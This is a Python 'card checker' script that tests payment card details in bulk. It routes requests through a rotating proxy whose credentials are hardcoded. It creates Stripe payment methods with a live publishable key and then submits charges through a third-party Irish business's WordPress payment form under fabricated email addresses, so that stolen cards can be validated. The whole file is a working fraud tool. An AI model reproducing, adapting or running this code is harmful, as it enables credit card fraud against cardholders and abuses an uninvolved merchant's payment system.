import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "p.webshare.io:80:rotate-zlanvdvs:7zzew86qyip3"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(2, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F399197339e%3B+stripe-js-v3%2F399197339e%3B+card-element&key=pk_live_51HhzZKHEsfbXPUvQKw79kMARq3HSfmURGvLtWi0HKY8tEQm6R610k0HxpM4EH025FYbzOeVOThqIpKo1MNHAeIsH00ewKzPMQ8'
	
	response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = response.json()['id']
	
	headers = {
	    'authority': 'islandtraining.ie',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://islandtraining.ie',
	    'referer': 'https://islandtraining.ie/pay/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'action': 'wp_full_stripe_inline_payment_charge',
	    'wpfs-form-name': 'Pay',
	    'wpfs-custom-amount-unique': '1',
	    'wpfs-card-holder-name': '',
	    'wpfs-card-holder-email': f'genpaypal{random_amount2}@gmail.com',
	    'wpfs-custom-input[]': [
	        '',
	        '',
	        '',
	    ],
	    'wpfs-stripe-payment-method-id': f'{pm}',
	}
	
	response = session.post('https://islandtraining.ie/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	try:
		result = re.search(r'"message":"(.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
